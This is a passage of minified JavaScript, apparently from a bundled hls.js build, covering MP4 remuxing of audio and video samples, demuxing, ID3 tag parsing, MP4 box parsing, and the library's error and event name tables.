detected"),this.generateIS(t,r,a)),this.remuxVideo(r,d,s,g)}else if(u){var A=this.remuxVideo(r,d,s,0,o);A&&t.codec&&this.remuxEmptyAudio(t,c,s,A)}}n.samples.length&&this.remuxID3(n,a),i.samples.length&&this.remuxText(i,a),this.observer.trigger(oe.default.FRAG_PARSED)},t.generateIS=function e(t,r,n){var f,h,i=this.observer,a=t.samples,s=r.samples,o=this.typeSupported,l="audio/mp4",u={},c={tracks:u},d=void 0===this._initPTS;if(d&&(f=h=1/0),t.config&&a.length&&(t.timescale=t.samplerate,ue.logger.log("audio sampling rate : "+t.samplerate),t.isAAC||(o.mpeg?(l="audio/mpeg",t.codec=""):o.mp3&&(t.codec="mp3")),u.audio={container:l,codec:t.codec,initSegment:!t.isAAC&&o.mpeg?new Uint8Array:ce.initSegment([t]),metadata:{channelCount:t.channelCount}},d&&(f=h=a[0].pts-Math.round(t.inputTimeScale*n))),r.sps&&r.pps&&s.length){var p=r.inputTimeScale;if(r.timescale=p,u.video={container:"video/mp4",codec:r.codec,initSegment:ce.initSegment([r]),metadata:{width:r.width,height:r.height}},d){var v=this.getVideoStartPts(s),g=Math.round(p*n);h=Math.min(h,he(s[0].dts,v)-g),f=Math.min(f,v-g),this.observer.trigger(oe.default.INIT_PTS_FOUND,{initPTS:f})}}else d&&u.audio&&this.observer.trigger(oe.default.INIT_PTS_FOUND,{initPTS:f});Object.keys(u).length?(i.trigger(oe.default.FRAG_PARSING_INIT_SEGMENT,c),this.ISGenerated=!0,d&&(this._initPTS=f,this._initDTS=h)):i.trigger(oe.default.ERROR,{type:le.ErrorTypes.MEDIA_ERROR,details:le.ErrorDetails.FRAG_PARSING_ERROR,fatal:!1,reason:"no audio/video samples found"})},t.remuxVideo=function M(e,F,t,r){var u,c,d,f,h,n=e.timescale,i=e.samples,a=[],s=i.length,o=this._initPTS,l=8,p=Number.POSITIVE_INFINITY,v=Number.NEGATIVE_INFINITY,g=0,B=!1,A=this.nextAvcDts;if(0!==s){if(!t)A=F*n-(i[0].pts-he(i[0].dts,i[0].pts));for(var m=0;m<s;m++){var y=i[m];y.pts=he(y.pts-o,A),y.dts=he(y.dts-o,A),y.dts>y.pts&&(g=Math.max(Math.min(g,y.pts-y.dts),-1*pe)),y.dts<i[m>0?m-1:m].dts&&(B=!0)}B&&i.sort((function(e,t){var r=e.dts-t.dts,n=e.pts-t.pts;return r||n||e.id-t.id})),f=i[0].dts,h=i[s-1].dts;var E=Math.round((h-f)/(s-1));if(g<0){if(g<-2*E){ue.logger.warn("PTS < DTS detected in video samples, offsetting DTS from PTS by "+de(-E,!0)+" ms");for(var b=g,k=0;k<s;k++)i[k].dts=b=Math.max(b,i[k].pts-E),i[k].pts=Math.max(b,i[k].pts)}else{ue.logger.warn("PTS < DTS detected in video samples, shifting DTS by "+de(g,!0)+" ms to overcome this issue");for(var _=0;_<s;_++)i[_].dts=i[_].dts+g}f=i[0].dts,h=i[s-1].dts}if(t){var T=f-A,V=T>E;if(V||T<-1){V?ue.logger.warn("AVC: "+de(T,!0)+" ms ("+T+"dts) hole between fragments detected, filling it"):ue.logger.warn("AVC: "+de(-T,!0)+" ms ("+T+"dts) overlapping between fragments detected"),f=A;var K=i[0].pts-T;i[0].dts=f,i[0].pts=K,ue.logger.log("Video: First PTS/DTS adjusted: "+de(K,!0)+"/"+de(f,!0)+", delta: "+de(T,!0)+" ms")}}fe&&fe<75&&(f=Math.max(0,f));for(var Y=0,H=0,S=0;S<s;S++){for(var C=i[S],z=C.units,$=z.length,R=0,w=0;w<$;w++)R+=z[w].data.length;H+=R,Y+=$,C.length=R,C.dts=Math.max(C.dts,f),C.pts=Math.max(C.pts,C.dts,0),p=Math.min(C.pts,p),v=Math.max(C.pts,v)}h=i[s-1].dts;var O=H+4*Y+8;try{c=new Uint8Array(O)}catch(e){return void this.observer.trigger(oe.default.ERROR,{type:le.ErrorTypes.MUX_ERROR,details:le.ErrorDetails.REMUX_ALLOC_ERROR,fatal:!1,bytes:O,reason:"fail allocating video mdat "+O})}var W=new DataView(c.buffer);W.setUint32(0,O),c.set(ce.types.mdat,4);for(var L=0;L<s;L++){for(var Z,I=i[L],q=I.units,X=0,D=0,Q=q.length;D<Q;D++){var J=q[D],ee=J.data,P=J.data.byteLength;W.setUint32(l,P),l+=4,c.set(ee,l),l+=P,X+=4+P}if(L<s-1)u=i[L+1].dts-I.dts;else{var te=this.config,N=I.dts-i[L>0?L-1:L].dts;if(te.stretchShortVideoTrack){var re=te.maxBufferHole,ne=Math.floor(re*n),x=(r?p+r*n:this.nextAudioPts)-I.pts;x>ne?((u=x-N)<0&&(u=N),ue.logger.log("It is approximately "+de(x,!1)+" ms to the next segment; using duration "+de(u,!1)+" ms for the last video frame.")):u=N}else u=N}Z=Math.round(I.pts-I.dts),a.push({size:X,duration:u,cts:Z,flags:{isLeading:0,isDependedOn:0,hasRedundancy:0,degradPrio:0,dependsOn:I.key?2:1,isNonSync:I.key?0:1}})}this.nextAvcDts=h+u;var ie=e.dropped;if(e.nbNalu=0,e.dropped=0,a.length&&navigator.userAgent.toLowerCase().indexOf("chrome")>-1){var ae=a[0].flags;ae.dependsOn=2,ae.isNonSync=0}e.samples=a,d=ce.moof(e.sequenceNumber++,f,e),e.samples=[];var se={data1:d,data2:c,startPTS:p/n,endPTS:(v+u)/n,startDTS:f/n,endDTS:this.nextAvcDts/n,type:"video",hasAudio:!1,hasVideo:!0,nb:a.length,dropped:ie};return this.observer.trigger(oe.default.FRAG_PARSING_DATA,se),se}},t.remuxAudio=function M(e,t,r,n){var u,c,d,f,h,p,i=e.inputTimeScale,F=e.timescale,a=i/F,s=(e.isAAC?1024:1152)*a,o=this._initPTS,l=!e.isAAC&&this.typeSupported.mpeg,v=l?0:8,g=e.samples,A=[],m=this.nextAudioPts;if(r|=g.length&&m&&(n&&Math.abs(t-m/i)<.1||Math.abs(g[0].pts-m-o)<20*s),g.forEach((function(e){e.pts=e.dts=he(e.pts-o,t*i)})),g=g.filter((function(e){return e.pts>=0})),0!==g.length){if(r||(m=n?Math.max(0,t*i):g[0].pts),e.isAAC)for(var y=this.config.maxAudioFramesDrift,E=0,b=m;E<g.length;){var k=g[E],_=k.pts,T=_-b;if(T<=-y*s)r||E>0?(ue.logger.warn("Dropping 1 audio frame @ "+de(b,!0)/1e3+"s due to "+de(T,!0)+" ms overlap."),g.splice(E,1)):(ue.logger.warn("Audio frame @ "+de(_,!0)/1e3+"s overlaps nextAudioPts by "+de(T,!0)+" ms."),b=_+s,E++);else if(T>=y*s&&T<W&&b){var S=Math.round(T/s);ue.logger.warn("Injecting "+S+" audio frames @ "+de(b,!0)/1e3+"s due to "+de(T,!0)+" ms gap.");for(var C=0;C<S;C++){var R=Math.max(b,0);(c=$.getSilentFrame(e.manifestCodec||e.codec,e.channelCount))||(ue.logger.log("Unable to get silent frame for given audio codec; duplicating last frame instead."),c=k.unit.subarray()),g.splice(E,0,{unit:c,pts:R,dts:R}),b+=s,E++}k.pts=k.dts=b,b+=s,E++}else k.pts=k.dts=b,b+=s,E++}for(var w=g.length,O=0;w--;)O+=g[w].unit.byteLength;for(var L=0,U=g.length;L<U;L++){var j=g[L],I=j.unit,D=j.pts;if(void 0!==p&&u)u.duration=Math.round((D-p)/a);else{var P=D-m,N=0;if(r&&e.isAAC&&P){if(P>0&&P<W)N=Math.round((D-m)/s),ue.logger.log(de(P,!0)+" ms hole between AAC samples detected,filling it"),N>0&&((c=$.getSilentFrame(e.manifestCodec||e.codec,e.channelCount))||(c=I.subarray()),O+=N*c.length);else if(P<-12){ue.logger.log("drop overlapping AAC sample, expected/parsed/delta: "+de(m,!0)+" ms / "+de(D,!0)+" ms / "+de(-P,!0)+" ms"),O-=I.byteLength;continue}D=m}if(h=D,!(O>0))return;O+=v;try{d=new Uint8Array(O)}catch(e){return void this.observer.trigger(oe.default.ERROR,{type:le.ErrorTypes.MUX_ERROR,details:le.ErrorDetails.REMUX_ALLOC_ERROR,fatal:!1,bytes:O,reason:"fail allocating audio mdat "+O})}l||(new DataView(d.buffer).setUint32(0,O),d.set(ce.types.mdat,4));for(var G=0;G<N;G++)(c=$.getSilentFrame(e.manifestCodec||e.codec,e.channelCount))||(ue.logger.log("Unable to get silent frame for given audio codec; duplicating this frame instead."),c=I.subarray()),d.set(c,v),v+=c.byteLength,u={size:c.byteLength,cts:0,duration:1024,flags:{isLeading:0,isDependedOn:0,hasRedundancy:0,degradPrio:0,dependsOn:1}},A.push(u)}d.set(I,v);var K=I.byteLength;v+=K,u={size:K,cts:0,duration:0,flags:{isLeading:0,isDependedOn:0,hasRedundancy:0,degradPrio:0,dependsOn:1}},A.push(u),p=D}var x=0;if((w=A.length)>=2&&(x=A[w-2].duration,u.duration=x),w){this.nextAudioPts=m=p+a*x,e.samples=A,f=l?new Uint8Array:ce.moof(e.sequenceNumber++,h/a,e),e.samples=[];var Y=h/i,H=m/i,z={data1:f,data2:d,startPTS:Y,endPTS:H,startDTS:Y,endDTS:H,type:"audio",hasAudio:!0,hasVideo:!1,nb:w};return this.observer.trigger(oe.default.FRAG_PARSING_DATA,z),z}return null}},t.remuxEmptyAudio=function e(t,r,n,i){var a=t.inputTimeScale,o=a/(t.samplerate?t.samplerate:a),l=this.nextAudioPts,u=(void 0!==l?l:i.startDTS*a)+this._initDTS,c=i.endDTS*a+this._initDTS,f=1024*o,h=Math.ceil((c-u)/f),p=$.getSilentFrame(t.manifestCodec||t.codec,t.channelCount);if(ue.logger.warn("remux empty Audio"),p){for(var v=[],g=0;g<h;g++){var A=u+g*f;v.push({unit:p,pts:A,dts:A})}t.samples=v,this.remuxAudio(t,r,n)}else ue.logger.trace("Unable to remuxEmptyAudio since we were unable to get a silent frame for given audio codec!")},t.remuxID3=function e(t,r){var n=t.samples.length;if(n){for(var i=t.inputTimeScale,a=this._initPTS,s=this._initDTS,o=0;o<n;o++){var l=t.samples[o];l.pts=he(l.pts-a,r*i)/i,l.dts=he(l.dts-s,r*i)/i}this.observer.trigger(oe.default.FRAG_PARSING_METADATA,{samples:t.samples}),t.samples=[]}},t.remuxText=function e(t,r){var n=t.samples.length,i=t.inputTimeScale,a=this._initPTS;if(n){for(var s=0;s<n;s++){var o=t.samples[s];o.pts=he(o.pts-a,r*i)/i}t.samples.sort((function(e,t){return e.pts-t.pts})),this.observer.trigger(oe.default.FRAG_PARSING_USERDATA,{samples:t.samples})}t.samples=[]},e}();function he(e,t){var r;if(void 0===t)return e;for(r=t<e?-8589934592:8589934592;Math.abs(e-t)>4294967296;)e+=r;return e}var T,_=j,V=function(){function e(e){this.observer=e}var t=e.prototype;return t.destroy=function e(){},t.resetTimeStamp=function e(){},t.resetInitSegment=function e(){},t.remux=function e(t,r,n,i,a,s,o,l){var u=this.observer,c="";t&&(c+="audio"),r&&(c+="video"),u.trigger(oe.default.FRAG_PARSING_DATA,{data1:l,startPTS:a,startDTS:a,type:c,hasAudio:!!t,hasVideo:!!r,nb:1,dropped:0}),u.trigger(oe.default.FRAG_PARSED)},e}(),G=V,p=Object(r.getSelfScope)();try{T=p.performance.now.bind(p.performance)}catch(e){ue.logger.debug("Unable to use Performance API on this environment"),T=p.Date.now}var K=function(){function e(e,t,r,n){this.observer=e,this.typeSupported=t,this.config=r,this.vendor=n}var t=e.prototype;return t.destroy=function e(){var t=this.demuxer;t&&t.destroy()},t.push=function e(t,r,n,i,a,s,o,l,u,c,d,f){var h=this;if(t.byteLength>0&&null!=r&&null!=r.key&&"AES-128"===r.method){var p=this.decrypter;null==p&&(p=this.decrypter=new g.default(this.observer,this.config));var v=T();p.decrypt(t,r.key.buffer,r.iv.buffer,(function(e){var t=T();h.observer.trigger(oe.default.FRAG_DECRYPTED,{stats:{tstart:v,tdecrypt:t}}),h.pushDecrypted(new Uint8Array(e),r,new Uint8Array(n),i,a,s,o,l,u,c,d,f)}))}else this.pushDecrypted(new Uint8Array(t),r,new Uint8Array(n),i,a,s,o,l,u,c,d,f)},t.pushDecrypted=function e(t,r,n,i,a,s,o,l,u,c,d,f){var h=this.demuxer,p=this.remuxer;if(!h||o||l){for(var y,v=this.observer,g=this.typeSupported,A=this.config,m=[{demux:P,remux:_},{demux:R.default,remux:G},{demux:C,remux:_},{demux:F,remux:_}],E=0,b=m.length;E<b&&!(y=m[E]).demux.probe(t);E++);if(!y)return void v.trigger(oe.default.ERROR,{type:le.ErrorTypes.MEDIA_ERROR,details:le.ErrorDetails.FRAG_PARSING_ERROR,fatal:!0,reason:"no demux matching with content found"});p&&p instanceof y.remux||(p=new y.remux(v,A,g,this.vendor)),h&&h instanceof y.demux||(h=new y.demux(v,p,A,g),this.probe=y.demux.probe),this.demuxer=h,this.remuxer=p}(o||l)&&(h.resetInitSegment(n,i,a,c),p.resetInitSegment()),o&&(h.resetTimeStamp(f),p.resetTimeStamp(f)),"function"==typeof h.setDecryptData&&h.setDecryptData(r),h.append(t,s,u,d)},e}();e.default=K},"./src/demux/demuxer-worker.js":function(e,t,r){r.r(t);var s=r("./src/demux/demuxer-inline.js"),o=r("./src/events.js"),l=r("./src/utils/logger.js"),u=r("./node_modules/eventemitter3/index.js");t.default=function e(i){var a=new u.EventEmitter;a.trigger=function e(t){for(var r=arguments.length,n=new Array(r>1?r-1:0),i=1;i<r;i++)n[i-1]=arguments[i];a.emit.apply(a,[t,t].concat(n))},a.off=function e(t){for(var r=arguments.length,n=new Array(r>1?r-1:0),i=1;i<r;i++)n[i-1]=arguments[i];a.removeListener.apply(a,[t].concat(n))};var n=function e(t,r){i.postMessage({event:t,data:r})};i.addEventListener("message",(function(e){var t=e.data;switch(t.cmd){case"init":var r=JSON.parse(t.config);i.demuxer=new s.default(a,t.typeSupported,r,t.vendor),Object(l.enableLogs)(r.debug),n("init",null);break;case"demux":i.demuxer.push(t.data,t.decryptdata,t.initSegment,t.audioCodec,t.videoCodec,t.timeOffset,t.discontinuity,t.trackSwitch,t.contiguous,t.duration,t.accurateTimeOffset,t.defaultInitPTS)}})),a.on(o.default.FRAG_DECRYPTED,n),a.on(o.default.FRAG_PARSING_INIT_SEGMENT,n),a.on(o.default.FRAG_PARSED,n),a.on(o.default.ERROR,n),a.on(o.default.FRAG_PARSING_METADATA,n),a.on(o.default.FRAG_PARSING_USERDATA,n),a.on(o.default.INIT_PTS_FOUND,n),a.on(o.default.FRAG_PARSING_DATA,(function(e,t){var r=[],n={event:e,data:t};t.data1&&(n.data1=t.data1.buffer,r.push(t.data1.buffer),delete t.data1),t.data2&&(n.data2=t.data2.buffer,r.push(t.data2.buffer),delete t.data2),i.postMessage(n,r)}))}},"./src/demux/id3.js":function(e,t,r){r.r(t),r.d(t,"utf8ArrayToStr",(function(){return s}));var a,n=r("./src/utils/get-self-scope.js"),i=function(){function l(){}return l.isHeader=function e(t,r){return r+10<=t.length&&73===t[r]&&68===t[r+1]&&51===t[r+2]&&t[r+3]<255&&t[r+4]<255&&t[r+6]<128&&t[r+7]<128&&t[r+8]<128&&t[r+9]<128},l.isFooter=function e(t,r){return r+10<=t.length&&51===t[r]&&68===t[r+1]&&73===t[r+2]&&t[r+3]<255&&t[r+4]<255&&t[r+6]<128&&t[r+7]<128&&t[r+8]<128&&t[r+9]<128},l.getID3Data=function e(t,r){for(var n=r,i=0;l.isHeader(t,r);){i+=10,i+=l._readSize(t,r+6),l.isFooter(t,r+10)&&(i+=10),r+=i}if(i>0)return t.subarray(n,n+i)},l._readSize=function e(t,r){var n=0;return n=(127&t[r])<<21,n|=(127&t[r+1])<<14,n|=(127&t[r+2])<<7,n|=127&t[r+3]},l.getTimeStamp=function e(t){for(var r=l.getID3Frames(t),n=0;n<r.length;n++){var i=r[n];if(l.isTimeStampFrame(i))return l._readTimeStamp(i)}},l.isTimeStampFrame=function e(t){return t&&"PRIV"===t.key&&"com.apple.streaming.transportStreamTimestamp"===t.info},l._getFrameData=function e(t){var r=String.fromCharCode(t[0],t[1],t[2],t[3]),n=l._readSize(t,4);return{type:r,size:n,data:t.subarray(10,10+n)}},l.getID3Frames=function e(t){for(var r=0,n=[];l.isHeader(t,r);){for(var i=l._readSize(t,r+6),a=(r+=10)+i;r+8<a;){var s=l._getFrameData(t.subarray(r)),o=l._decodeFrame(s);o&&n.push(o),r+=s.size+10}l.isFooter(t,r)&&(r+=10)}return n},l._decodeFrame=function e(t){return"PRIV"===t.type?l._decodePrivFrame(t):"W"===t.type[0]?l._decodeURLFrame(t):l._decodeTextFrame(t)},l._readTimeStamp=function e(t){if(8===t.data.byteLength){var r=new Uint8Array(t.data),n=1&r[3],i=(r[4]<<23)+(r[5]<<15)+(r[6]<<7)+r[7];return i/=45,n&&(i+=47721858.84),Math.round(i)}},l._decodePrivFrame=function e(t){if(!(t.size<2)){var r=l._utf8ArrayToStr(t.data,!0),n=new Uint8Array(t.data.subarray(r.length+1));return{key:t.type,info:r,data:n.buffer}}},l._decodeTextFrame=function e(t){if(!(t.size<2)){if("TXXX"===t.type){var r=1,n=l._utf8ArrayToStr(t.data.subarray(r),!0);r+=n.length+1;var i=l._utf8ArrayToStr(t.data.subarray(r));return{key:t.type,info:n,data:i}}var a=l._utf8ArrayToStr(t.data.subarray(1));return{key:t.type,data:a}}},l._decodeURLFrame=function e(t){if("WXXX"===t.type){if(t.size<2)return;var r=1,n=l._utf8ArrayToStr(t.data.subarray(r),!0);r+=n.length+1;var i=l._utf8ArrayToStr(t.data.subarray(r));return{key:t.type,info:n,data:i}}var a=l._utf8ArrayToStr(t.data);return{key:t.type,data:a}},l._utf8ArrayToStr=function e(t,r){void 0===r&&(r=!1);var n=f();if(n){var i=n.decode(t);if(r){var a=i.indexOf("\0");return-1!==a?i.substring(0,a):i}return i.replace(/\0/g,"")}for(var o,l,u,s=t.length,c="",d=0;d<s;){if(0===(o=t[d++])&&r)return c;if(0!==o&&3!==o)switch(o>>4){case 0:case 1:case 2:case 3:case 4:case 5:case 6:case 7:c+=String.fromCharCode(o);break;case 12:case 13:l=t[d++],c+=String.fromCharCode((31&o)<<6|63&l);break;case 14:l=t[d++],u=t[d++],c+=String.fromCharCode((15&o)<<12|(63&l)<<6|63&u)}}return c},l}();function f(){var e=Object(n.getSelfScope)();return a||void 0===e.TextDecoder||(a=new e.TextDecoder("utf-8")),a}var s=i._utf8ArrayToStr;t.default=i},"./src/demux/mp4demuxer.js":function(e,t,r){r.r(t);var h=r("./src/utils/logger.js"),u=r("./src/events.js"),o=Math.pow(2,32)-1,n=function(){function y(e,t){this.observer=e,this.remuxer=t}var e=y.prototype;return e.resetTimeStamp=function e(t){this.initPTS=t},e.resetInitSegment=function e(t,r,n,i){if(t&&t.byteLength){var a=this.initData=y.parseInitSegment(t);null==r&&(r="mp4a.40.5"),null==n&&(n="avc1.42e01e");var s={};a.audio&&a.video?s.audiovideo={container:"video/mp4",codec:r+","+n,initSegment:i?t:null}:(a.audio&&(s.audio={container:"audio/mp4",codec:r,initSegment:i?t:null}),a.video&&(s.video={container:"video/mp4",codec:n,initSegment:i?t:null})),this.observer.trigger(u.default.FRAG_PARSING_INIT_SEGMENT,{tracks:s})}else r&&(this.audioCodec=r),n&&(this.videoCodec=n)},y.probe=function e(t){return y.findBox({data:t,start:0,end:Math.min(t.length,16384)},["moof"]).length>0},y.bin2str=function e(t){return String.fromCharCode.apply(null,t)},y.readUint16=function e(t,r){t.data&&(r+=t.start,t=t.data);var n=t[r]<<8|t[r+1];return n<0?65536+n:n},y.readUint32=function e(t,r){t.data&&(r+=t.start,t=t.data);var n=t[r]<<24|t[r+1]<<16|t[r+2]<<8|t[r+3];return n<0?4294967296+n:n},y.writeUint32=function e(t,r,n){t.data&&(r+=t.start,t=t.data),t[r]=n>>24,t[r+1]=n>>16&255,t[r+2]=n>>8&255,t[r+3]=255&n},y.findBox=function e(t,r){var i,a,o,l,u,c,n=[];if(t.data?(u=t.start,o=t.end,t=t.data):(u=0,o=t.byteLength),!r.length)return null;for(i=u;i<o;)c=(a=y.readUint32(t,i))>1?i+a:o,y.bin2str(t.subarray(i+4,i+8))===r[0]&&(1===r.length?n.push({data:t,start:i+8,end:c}):(l=y.findBox({data:t,start:i+8,end:c},r.slice(1))).length&&(n=n.concat(l))),i=c;return n},y.parseSegmentIndex=function e(t){var s,r=y.findBox(t,["moov"])[0],n=r?r.end:null,i=0,a=y.findBox(t,["sidx"]);if(!a||!a[0])return null;s=[];var o=(a=a[0]).data[0];i=0===o?8:16;var l=y.readUint32(a,i);i+=4;i+=0===o?8:16,i+=2;var d=a.end+0,f=y.readUint16(a,i);i+=2;for(var h=0;h<f;h++){var p=i,v=y.readUint32(a,p);p+=4;var g=2147483647&v;if(1===(2147483648&v)>>>31)return void console.warn("SIDX has hierarchical references (not supported)");var m=y.readUint32(a,p);p+=4,s.push({referenceSize:g,subsegmentDuration:m,info:{duration:m/l,start:d,end:d+g-1}}),d+=g,i=p+=4}return{earliestPresentationTime:0,timescale:l,version:o,referencesCount:f,references:s,moovEndOffset:n}},y.parseInitSegment=function e(t){var f=[];return y.findBox(t,["moov","trak"]).forEach((function(e){var t=y.findBox(e,["tkhd"])[0];if(t){var r=t.data[t.start],n=0===r?12:20,i=y.readUint32(t,n),a=y.findBox(e,["mdia","mdhd"])[0];if(a){n=0===(r=a.data[a.start])?12:20;var s=y.readUint32(a,n),o=y.findBox(e,["mdia","hdlr"])[0];if(o){var u={soun:"audio",vide:"video"}[y.bin2str(o.data.subarray(o.start+8,o.start+12))];if(u){var c=y.findBox(e,["mdia","minf","stbl","stsd"]);if(c.length){c=c[0];var d=y.bin2str(c.data.subarray(c.start+12,c.start+16));h.logger.log("MP4Demuxer:"+u+":"+d+" found")}f[i]={timescale:s,type:u},f[u]={timescale:s,id:i}}}}}})),f},y.getStartDTS=function e(a,t){var r,n,i;return r=y.findBox(t,["moof","traf"]),n=[].concat.apply([],r.map((function(i){return y.findBox(i,["tfhd"]).map((function(e){var t,r,n;return t=y.readUint32(e,4),r=a[t].timescale||9e4,n=y.findBox(i,["tfdt"]).map((function(e){var t,r;return t=e.data[e.start],r=y.readUint32(e,4),1===t&&(r*=Math.pow(2,32),r+=y.readUint32(e,8)),r}))[0],n/r}))}))),i=Math.min.apply(null,n),isFinite(i)?i:0},y.offsetStartDTS=function e(n,t,s){y.findBox(t,["moof","traf"]).map((function(r){return y.findBox(r,["tfhd"]).map((function(e){var t=y.readUint32(e,4),a=n[t].timescale||9e4;y.findBox(r,["tfdt"]).map((function(e){var t=e.data[e.start],r=y.readUint32(e,4);if(0===t)y.writeUint32(e,4,r-s*a);else{r*=Math.pow(2,32),r+=y.readUint32(e,8),r-=s*a,r=Math.max(r,0);var n=Math.floor(r/(o+1)),i=Math.floor(r%(o+1));y.writeUint32(e,4,n),y.writeUint32(e,8,i)}}))}))}))},e.append=function e(t,r,n,i){var a=this.initData;a||(this.resetInitSegment(t,this.audioCodec,this.videoCodec,!1),a=this.initData);var s,o=this.initPTS;if(void 0===o){var l=y.getStartDTS(a,t);this.initPTS=o=l-r,this.observer.trigger(u.default.INIT_PTS_FOUND,{initPTS:o})}y.offsetStartDTS(a,t,o),s=y.getStartDTS(a,t),this.remuxer.remux(a.audio,a.video,null,null,s,n,i,t)},e.destroy=function e(){},y}();t.default=n},"./src/errors.ts":function(e,t,r){var n,i;r.r(t),r.d(t,"ErrorTypes",(function(){return n})),r.d(t,"ErrorDetails",(function(){return i})),function(e){e.NETWORK_ERROR="networkError",e.MEDIA_ERROR="mediaError",e.KEY_SYSTEM_ERROR="keySystemError",e.MUX_ERROR="muxError",e.OTHER_ERROR="otherError"}(n||(n={})),function(e){e.KEY_SYSTEM_NO_KEYS="keySystemNoKeys",e.KEY_SYSTEM_NO_ACCESS="keySystemNoAccess",e.KEY_SYSTEM_NO_SESSION="keySystemNoSession",e.KEY_SYSTEM_LICENSE_REQUEST_FAILED="keySystemLicenseRequestFailed",e.KEY_SYSTEM_NO_INIT_DATA="keySystemNoInitData",e.MANIFEST_LOAD_ERROR="manifestLoadError",e.MANIFEST_LOAD_TIMEOUT="manifestLoadTimeOut",e.MANIFEST_PARSING_ERROR="manifestParsingError",e.MANIFEST_INCOMPATIBLE_CODECS_ERROR="manifestIncompatibleCodecsError",e.LEVEL_EMPTY_ERROR="levelEmptyError",e.LEVEL_LOAD_ERROR="levelLoadError",e.LEVEL_LOAD_TIMEOUT="levelLoadTimeOut",e.LEVEL_SWITCH_ERROR="levelSwitchError",e.AUDIO_TRACK_LOAD_ERROR="audioTrackLoadError",e.AUDIO_TRACK_LOAD_TIMEOUT="audioTrackLoadTimeOut",e.FRAG_LOAD_ERROR="fragLoadError",e.FRAG_LOAD_TIMEOUT="fragLoadTimeOut",e.FRAG_DECRYPT_ERROR="fragDecryptError",e.FRAG_PARSING_ERROR="fragParsingError",e.REMUX_ALLOC_ERROR="remuxAllocError",e.KEY_LOAD_ERROR="keyLoadError",e.KEY_LOAD_TIMEOUT="keyLoadTimeOut",e.BUFFER_ADD_CODEC_ERROR="bufferAddCodecError",e.BUFFER_APPEND_ERROR="bufferAppendError",e.BUFFER_APPENDING_ERROR="bufferAppendingError",e.BUFFER_STALLED_ERROR="bufferStalledError",e.BUFFER_FULL_ERROR="bufferFullError",e.BUFFER_SEEK_OVER_HOLE="bufferSeekOverHole",e.BUFFER_NUDGE_ON_STALL="bufferNudgeOnStall",e.INTERNAL_EXCEPTION="internalException"}(i||(i={}))},"./src/events.js":function(e,t,r){r.r(t);t.default={MEDIA_ATTACHING:"hlsMediaAttaching",MEDIA_ATTACHED:"hlsMediaAttached",MEDIA_DETACHING:"hlsMediaDetaching",MEDIA_DETACHED:"hlsMediaDetached",BUFFER_RESET:"hlsBufferReset",BUFFER_CODECS:"hlsBufferCodecs",BUFFER_CREATED:"hlsBufferCreated",BUFFER_APPENDING:"hlsBufferAppending",BUFFER_APPENDED:"hlsBufferAppended",BUFFER_EOS:"hlsBufferEos",BUFFER_FLUSHING:"hlsBufferFlushing",BUFFER_FLUSHED:"hlsBufferFlushed",MANIFEST_LOADING:"hlsManifestLoading",MANIFEST_LOADED:"hlsManifestLoaded",MANIFEST_PARSED:"hlsManifestParsed",LEVEL_SWITCHING:"hlsLevelSwitching",LEVEL_SWITCHED:"hlsLevelSwitched",LEVEL_LOADING:"hlsLevelLoading",LEVEL_LOADED:"hlsLevelLoaded",LEVEL_UPDATED:"hlsLevelUpdated",LEVEL_PTS_UPDATED:"hlsLevelPtsUpdated",LEVELS_UPDATED:"hlsLevelsUpdated",AUDIO_TRACKS_UPDATED:"hlsAudioTracksUpdated",AUDIO_TRACK_SWITCHING:"hlsAudioTrackSwitching",AUDIO_TRACK_SWITCHED:"hlsAudioTrackSwitched",AUDIO_TRACK_LOADING:"hlsAudioTrackLoading",AUDIO_TRACK_LOADED:"hlsAudioTrackLoaded",SUBTITLE_TRACKS_UPDATED:"hlsSubtitleTracksUpdated",SUBTITLE_TRACK_SWITCH:"hlsSubtitleTrackSwitch",SUBTITLE_TRACK_LOADING:"hlsSubtitleTrackLoading",SUBTITLE_TRACK_LOADED:"hlsSubtitleTrackLoaded",SUBTITLE_FRAG_PROCESSED:"hlsSubtitleFragProcessed",CUES_PARSED:"hlsCuesParsed",NON_NATIVE_TEXT_TRACKS_FOUND:"hlsNonNativeTextTracksFound",INIT_PTS_FOUND:"hlsInitPtsFound",FRAG_LOADING:"hlsFragLoading",FRAG_LOAD_PROGRESS:"hlsFragLoadProgress",FRAG_LOAD_EMERGENCY_ABORTED:"hlsFragLoadEmergencyAborted",FRAG_LOADED:"hlsFragLoaded",FRAG_DECRYPTED:"hlsFragDecrypted",FRAG_PARSING_INIT_SEGMENT:"hlsFragParsingInitSegment",FRAG_PARSING_USERDATA:"hlsFragParsingUserdata",FRAG_PARSING_METADATA:"hlsFragParsingMetadata",FRAG_PARSING_DATA:"hlsFragParsingData",FRAG_PARSED:"hlsFragParsed",FRAG_BUFFERED:"hlsFragBuffered",FRAG_CHANGED:"hlsFragChanged",FPS_DROP:"hlsFpsDrop",FPS_DROP_LEVEL_CAPPING:"hlsFpsDropLevelCapping",ERROR:"hlsError",DESTROYING:"hlsDestroying",KEY_LOADING:"hlsKeyLoading",KEY_LOADED:"hlsKeyLoaded",STREAM_STATE_TRANSITION:"hlsStreamStateTransition",LIVE_BACK_BUFFER_REACHED:"hlsLiveBackBufferReached"}},"./src/hls.ts":function(r,S,e){e.r(S),e.d(S,"default",(function(){return Ln}));var t={};e.r(t),e.d(t,"newCue",(function(){return Er}));var m,a,n=e("./node_modules/url-toolkit/src/url-toolkit.js"),A=e("./src/errors.ts"),x=e("./src/polyfills/number.js"),M=e("./src/events.js"),F=e("./src/utils/logger.js"),C={hlsEventGeneric:!0,hlsHandlerDestroying:!0,hlsHandlerDestroyed:!0},R=function(){function e(e){this.hls=void 0,this.handledEvents=void 0,this.useGenericHandler=void 0,this.hls=e,this.onEvent=this.onEvent.bind(this);for(var t=arguments.length,r=new Array(t>1?t-1:0),n=1;n<t;n++)r[n-1]=arguments[n];this.handledEvents=r,this.useGenericHandler=!0,this.registerListeners()}var t=e.prototype;return t.destroy=function e(){this.onHandlerDestroying(),this.unregisterListeners(),this.onHandlerDestroyed()},t.onHandlerDestroying=function e(){},t.onHandlerDestroyed=function e(){},t.isEventHandler=function e(){return"object"==typeof this.handledEvents&&this.handledEvents.length&&"function"==typeof this.onEvent},t.registerListeners=function e(){this.isEventHandler()&&this.handledEvents.forEach((function(e){if(C[e])throw new Error("Forbidden event-name: "+e);this.hls.on(e,this.onEvent)}),this)},t.unregisterListeners=function e(){this.isEventHandler()&&this.handledEvents.forEach((function(e){this.hls.off(e,this.onEvent)}),this)},t.onEvent=function e(t,r){this.onEventGeneric(t,r)},t.onEventGeneric=function e(t,r){try{(function e(t,r){var 